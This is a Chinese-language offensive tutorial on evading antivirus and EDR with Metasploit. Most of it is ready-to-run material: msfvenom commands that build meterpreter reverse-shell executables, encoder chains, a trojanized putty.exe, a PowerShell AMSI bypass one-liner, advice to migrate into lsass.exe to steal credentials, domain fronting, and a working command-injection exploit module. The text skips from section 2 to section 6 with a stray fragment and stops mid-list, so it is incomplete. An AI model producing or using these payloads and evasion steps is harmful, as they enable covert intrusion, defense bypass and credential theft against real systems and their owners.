## 一、免杀技术详解

### 1.1 AV/EDR 检测原理

**杀毒软件检测方式：**

```
1. 静态检测（Static Analysis）
   - 特征码匹配（已知病毒的代码片段）
   - 哈希校验（MD5/SHA1/SHA256）
   - 启发式检测（可疑的代码结构）
   - 机器学习模型检测

2. 动态检测（Dynamic Analysis）
   - 沙箱运行（在隔离环境中执行）
   - 行为监控（API 调用、文件操作、网络行为）
   - 内存扫描（内存中的恶意代码）

3. 云扫描
   - 可疑文件上传到云端分析
   - 全球威胁情报共享

4. EDR（Endpoint Detection and Response）
   - 行为分析（进程注入、提权等）
   - 内存取证
   - 实时监控与响应
```

### 1.2 静态免杀方法

**方法一：编码器（Encoders）**

```bash
# 列出所有编码器
msfvenom -l encoders

# 常用编码器：
#   x86/shikata_ga_nai - 多边形编码（最经典）
#   x86/fnstenv_mov - FPU 指令编码
#   x86/countdown - 倒计时编码
#   x86/alpha_mixed - 字母数字混合编码
#   x86/xor_dynamic - 动态 XOR 编码
#   x64/xor - 64位 XOR 编码
#   x64/zutto_dekiru - 64位多边形编码

# 使用 shikata_ga_nai 多次编码
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 \
         -e x86/shikata_ga_nai -i 10 \
         -f exe -o encoded.exe

# 多重编码器组合
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 \
         -e x86/shikata_ga_nai -i 5 \
         -e x86/countdown -i 3 \
         -e x86/xor_dynamic -i 3 \
         -f exe -o multi_encoded.exe
```

**方法二：模板注入（Template Injection）**

```bash
# 将 payload 注入到合法程序中
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 \
         -x putty.exe \
         -k \
         -f exe -o putty_trojan.exe

# -x <file>: 指定模板文件
# -k: 保留模板原有的功能（程序正常运行）

# 常用模板：
# - 系统工具（putty、notepad++ 等）
# - 办公软件组件
# - 安装程序
# - 常用工具软件

# 注意：
# - 选择知名软件作为模板
# - 确保架构匹配（32位/64位）
# - -k 参数可能导致程序异常
```

**方法三：自定义加壳/加密**

```bash
# 1. 生成 raw shellcode
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 \
         -f raw -o shellcode.bin

# 2. 使用加密工具加密
#    - XOR 加密
#    - AES 加密
#    - RC4 加密
#    - Base64 + 混淆

# 3. 编写自定义加载器
#    - 运行时解密 shellcode
#    - 分配可执行内存
#    - 跳转执行

# 示例：XOR 加密的 C 加载器
# 见实战场景中的自定义加载器示例
```

**方法四：Stageless Payload**

```bash
# 使用 Stageless（无阶段）payload
# 减少网络连接特征

msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.1.1 LPORT=4444 \
         -f exe -o stageless.exe

# 对比：
# Staged (windows/meterpreter/reverse_tcp):
#   - 体积小（~170KB）
#   - 需要二次网络连接下载 stage
#   - 网络特征明显

# Stageless (windows/meterpreter_reverse_tcp):
#   - 体积大（~1MB+）
#   - 完整 payload 在一个文件中
#   - 减少网络特征
```

### 1.3 动态免杀方法

**方法一：进程注入**

```
进程注入技术：
1. 经典注入（CreateRemoteThread）
2. 反射式 DLL 注入（Reflective DLL Injection）
3. 进程空洞（Process Hollowing）
4. 线程劫持（Thread Hijacking）
5. APC 注入（Asynchronous Procedure Call）
6. 映射注入（Section View Mapping）

Metasploit 中的进程注入：
- migrate 命令（迁移进程）
- post/windows/manage/payload_inject 模块
- 各种 exploit 模块中的注入功能
```

**方法二：内存执行（无文件）**

```
无文件（Fileless）攻击：
- 不写入文件到磁盘
- 直接在内存中执行
- 难以被杀毒软件检测

实现方式：
1. PowerShell 内存执行
2. .NET 程序集反射加载
3. Office 宏 + 内存执行
4. WMI 事件订阅
5. 注册表存储 Payload

Metasploit 模块：
- exploit/windows/local/persistence
- post/windows/manage/payload_inject
- 各种 powershell 相关 payload
```

**方法三：AMSI Bypass**

```
AMSI（Anti-Malware Scan Interface）
- Windows 10 引入的接口
- 允许杀毒软件扫描脚本内容
- 支持 PowerShell、VBScript、JScript 等

绕过方法：
1. 内存补丁（Patch AmsiScanBuffer）
2. 反射式修改 amsi.dll
3. 环境变量欺骗
4. AMSI 初始化失败绕过

PowerShell AMSI Bypass 示例：
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').
GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

**方法四：ETW 绕过**

```
ETW（Event Tracing for Windows）
- Windows 的事件追踪机制
- EDR 常用来监控进程行为
- 监控进程创建、网络连接等

绕过方法：
1. 禁用 ETW
2. Patch EtwEventWrite
3. 绕过用户态 Hook
```

### 1.4 网络层免杀

**方法一：协议伪装**

```bash
# 使用 HTTPS 反向连接
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=443 \
         -f exe -o https_payload.exe

# 伪装成正常的 HTTPS 流量
# 加密流量，难以深度检测

# 使用 WinHTTP 传输

```

**方法二：端口选择**

```bash
# 使用常见服务端口
# 443 (HTTPS)
# 80 (HTTP)
# 53 (DNS)
# 8080 (HTTP 代理)

msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=443 \
         -f exe -o payload.exe
```

**方法三：域前置（Domain Fronting）**

```
原理：
- 利用 CDN 的 HTTPS 服务
- SNI 字段设置为合法域名
- Host 头设置为攻击服务器
- 流量看起来像访问合法网站

实现：
- 需要支持的 CDN 服务
- 配置 Metasploit 的 HttpHostHeader
- 设置 LHOST 为 CDN 域名
```

## 二、Meterpreter 高级技巧

### 2.1 进程迁移策略

```
为什么要迁移进程？
1. 稳定性：注入到的进程可能崩溃
2. 隐蔽性：常驻进程不易被怀疑
3. 权限：目标进程可能有更高权限
4. 凭证：LSASS 等进程可获取凭证

迁移目标选择：

| 场景 | 目标进程 | 原因 |
|------|---------|------|
| 稳定性 | explorer.exe | 用户登录后常驻 |
| 隐蔽性 | svchost.exe | 系统进程，不易引起怀疑 |
| 凭证窃取 | lsass.exe | 内存中有明文密码和哈希 |
| 网络访问 | 浏览器进程 | 利用其网络权限 |
| 系统权限 | services.exe | SYSTEM 权限 |

操作：
meterpreter > ps -S explorer     # 查找 explorer 进程
meterpreter > migrate -N explorer.exe  # 迁移到 explorer
meterpreter > migrate 4892   # 迁移到指定 PID
```

```bash
# Delegation Token（委派令牌）- 交互式登录获得，可离线使用
```

## 六、模块开发基础

### 6.1 Exploit 模块结构

```ruby
##
# 模块文件路径：modules/exploits/custom/custom_rce.rb
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Custom Web App RCE',
      'Description'    => %q{
        This module exploits a command injection vulnerability.
      },
      'Author'         => ['Your Name'],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['CVE', '2024-XXXX'],
          ['URL', 'https://example.com/advisory']
        ],
      'Platform'       => ['unix', 'linux'],
      'Arch'           => ARCH_CMD,
      'Targets'        => [['Automatic', {}]],
      'DefaultTarget'  => 0,
      'DisclosureDate' => '2024-01-01'
    ))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'Base path', '/']),
        OptString.new('CMD', [true, 'Command to inject', 'id'])
      ])
  end

  def check
    # 检测目标是否存在漏洞
    res = send_request_cgi(
      'method' => 'GET',
      'uri'    => normalize_uri(target_uri.path, 'ping.php')
    )
    
    if res && res.code == 200 && res.body.include?('Ping')
      return Exploit::CheckCode::Appears
    end
    
    Exploit::CheckCode::Safe
  end

  def exploit
    # 漏洞利用代码
    cmd = datastore['CMD']
    payload = "; #{cmd} #"
    
    res = send_request_cgi(
      'method' => 'POST',
      'uri'    => normalize_uri(target_uri.path, 'ping.php'),
      'vars_post' => {
        'host' => "127.0.0.1#{payload}"
      }
    )
    
    if res && res.code == 200
      print_good("Command executed successfully")
      print_line(res.body)
    else
      print_error("Exploit failed")
    end
  end
end
```

### 6.2 Auxiliary 模块结构

```ruby
# modules/auxiliary/scanner/custom/custom_scanner.rb

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'        => 'Custom Service Scanner',
      'Description' => 'Scan for custom service',
      'Author'      => 'Your Name',
      'License'     => MSF_LICENSE
    )
    
    register_options([
      Opt::RPORT(8888),
      OptInt.new('THREADS', [true, 'Threads', 10])
    ])
  end

  def run_host(ip)
    begin
      res = send_request_cgi({
        'method' => 'GET',
        'uri'    => '/',
        'rhost'  => ip
      }, 10)
      
      if res && res.code == 200
        print_good("#{ip}:#{rport} - Found custom service")
        report_service(
          :host  => ip,
          :port  => rport,
          :name  => 'custom',
          :info  => extract_version(res.body)
        )
      end
    rescue Rex::ConnectionError
      print_error("#{ip}:#{rport} - Connection failed")
    end
  end

  def extract_version(body)
    body.match(/version[=:]\s*([\d.]+)/i) ? $1 : 'unknown'
  end
end
```

## 七、实战绕过组合拳

### 7.1 免杀组合（从简单到复杂）

```
Level 1 - 基础：
  编码器 + 多次迭代
  msfvenom -p ... -e x86/shikata_ga_nai -i 10

Level 2 - 中级：
  多重编码 + 模板注入
```
